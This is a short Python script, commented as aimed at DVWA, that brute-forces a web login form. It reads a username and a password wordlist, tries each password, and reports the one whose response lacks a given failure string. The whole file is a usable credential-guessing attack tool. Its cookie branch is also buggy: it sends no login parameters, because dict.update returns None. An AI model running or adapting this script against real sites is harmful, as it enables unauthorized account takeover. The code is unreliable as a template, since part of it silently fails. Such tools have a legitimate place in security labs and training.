# specific to dvwa
import requests

url = input('[+] Enter Page URL: ')
username = input('[+] Enter Username For the Account To Bruteforce: ')
password_file = input('[+] Enter Password File To Use: ')
login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
cookie_value = input('Enter Cookie Value(Optional): ')


def bruteforce(username, url):
    for password in passwords:
        password = password.strip()
        print('Trying: ' + password)
        data = {'username': username, 'password': password, 'Login': 'submit'}
        if cookie_value != '':
            response = requests.get(
            url,
            params=data.update({'Login': 'Login'}), 
            cookies={'Cookie': cookie_value}
            )
        else:
            response = requests.post(url, data=data)
        if login_failed_string in response.content.decode():
            pass
        else:
            print('[+] Found password for the user: ' + username + ' - ', password)
            exit()


with open(password_file, 'r') as passwords:
    bruteforce(username, url)
